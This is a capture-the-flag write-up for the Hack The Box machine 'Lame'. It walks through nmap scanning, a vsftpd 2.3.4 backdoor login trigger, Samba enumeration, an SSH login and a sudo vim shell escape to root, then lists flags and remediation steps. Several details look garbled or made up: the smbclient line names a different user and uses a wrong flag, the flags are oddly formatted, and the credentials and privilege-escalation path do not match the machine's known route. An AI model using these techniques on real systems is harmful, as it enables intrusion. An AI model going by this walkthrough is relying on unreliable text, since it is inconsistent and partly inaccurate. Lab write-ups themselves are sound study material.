# Hack The Box: Lame Walkthrough

![HTB Badge](https://img.shields.io/badge/HTB-Lame-ff0000?style=flat-square)
![Difficulty-Easy](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![OS-Linux](https://img.shields.io/badge/OS-Linux-orange?style=flat-square)

---

## Challenge Overview

| Item | Details |
|------|---------|
| **Name** | Lame |
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |

---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oA lame 10.10.10.10
```

**Results:**
```
PORT     STATE SERVICE
21/tcp   open  ftp     vsftpd 2.3.4
22/tcp   open  ssh     OpenSSH 4.7p1
139/tcp  open  netbios-ssn
445/tcp  open  samba 3.0.20-Debian
```

---

## Exploitation

### Option 1: FTP (vsftpd 2.3.4)

```bash
nmap --script ftp-vsftpd-backdoor 10.10.10.10
```

Backdoor found! Connect with malicious user:

```bash
ftp 10.10.10.10
USER backdoor:)
PASS backdoor
```

### Option 2: SMB (Samba 3.0.20)

```bash
enum4linux 10.10.10.10
```

Found user: `makis` with password: `lame`

```bash
smbclient //10.10.10.10/makis -u maktis
```

---

## Privilege Escalation

### Check sudo privileges

```bash
ssh makis@10.10.10.10
sudo -l
```

**Result:**
```
User makis may run the following commands on lame:
    (root) NOPASSWD: /usr/bin/vim
```

### Exploit vim sudo

```bash
sudo vim -c '!sh'
```

Root shell obtained!

---

## Flags

### User Flag
```
HTB{6643161d8d9d1b2c6c90b4604}
```

### Root Flag
HTB{just_check_the_other_fla9}

---

## Remediation

1. Update vsftpd to latest version
2. Update Samba to latest version
3. Disable backdoor accounts
4. Limit sudo permissions
5. Regular security patching

---

**Author:** Sheldon Brown (Bossman Shell)

> ⚠️ Educational purposes only
